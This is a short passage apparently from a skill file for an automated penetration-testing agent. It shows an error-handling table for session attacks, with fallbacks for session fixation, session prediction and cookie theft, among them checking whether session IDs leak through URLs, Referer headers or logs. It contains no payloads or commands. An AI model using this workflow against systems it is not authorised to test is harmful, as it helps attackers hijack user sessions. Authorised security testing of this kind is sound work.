> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| Session ID regenerated on each request | Verify if fixation/prediction still viable with new IDs; if secure → record `"status": "session_regenerated"` |
| HttpOnly/Secure flags prevent cookie theft | Test session ID exposure via URL, Referer, or logs; if protected → record `"session_hardened": true` |
| Session storage backend unreachable | Retry with alternative session handler detection; if unavailable → record `"status": "session_backend_error"` |
| Authentication token expired mid-attack | Re-fetch credentials from auth_credentials.json, retry current round |
